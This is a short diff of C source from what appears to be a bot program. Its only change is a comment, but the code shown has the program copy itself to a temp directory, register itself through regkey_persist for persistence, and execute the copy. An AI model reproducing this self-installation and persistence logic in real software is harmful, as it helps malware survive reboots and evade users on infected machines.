@@ -36,7 +36,7 @@ int main(int argc, char* argv[])
   /* check if the bot already exists in the temp directory */
   exists= (strcmp(target_path, curr_path) == 0);
 
-  if (!exists) /* copy to system path and execute*/
+  if (!exists) /* copy to temp path and execute*/
     {
       copy(curr_path, target_path);
       regkey_persist(target_path);
